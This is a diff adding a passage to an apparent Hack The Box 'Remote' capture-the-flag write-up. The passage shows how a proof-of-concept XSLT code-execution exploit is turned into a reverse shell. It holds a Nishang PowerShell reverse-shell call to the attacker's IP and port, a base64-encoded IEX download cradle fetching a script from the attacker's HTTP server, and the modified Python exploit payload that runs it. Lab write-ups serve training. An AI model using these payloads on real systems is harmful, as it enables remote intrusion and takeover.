@@ -324,3 +324,41 @@ Next I see the code is just poping calc. I changed this to ping.exe to test the 
 
 ![alt text](https://github.com/vipertooth/HTB-Remote/blob/master/resources/poc-ping.png)
 
+Time to get a reverse shell!  Nishang as a few good powershell shells that come loaded into Kali. The one I use most is `/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1`.  I need to modify the file with my host and port.  This can be done by copying the example in the being and pasting it at the last line of the script. 
+
+```bash
+{
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.17.215 -Port 9003
+```
+
+I changed the file name to r2.ps1 to make it easy to use.  To get the exploit to call this file we will need to change the script to call back and grab the reverse shell.  To make sure there is no issues being sent over http it is best to base64 encode the arguments string.  To do with I will open powershell on Kali and create the encoded string.
+
+```bash
+root@HTBKali:~/HTB/Remote# pwsh
+PowerShell 7.0.0
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+PS /root/HTB/Remote> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).downloadString('http://10.10.17.215:9000/r2.ps1')"))                  
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANwAuADIAMQA1ADoAOQAwADAAMAAvAHIAMgAuAHAAcwAxACcAKQA=
+```
+
+Then I updated the exploit script to be as follows:
+```python
+payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
+xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
+<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
+{ string cmd = "-encodedcommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANwAuADIAMQA1ADoAOQAwADAAMAAvAHIAMgAuAHAAcwAxACcAKQA="
+ proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
+ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
+ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
+ </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
+ </xsl:template> </xsl:stylesheet> ';
+ ```
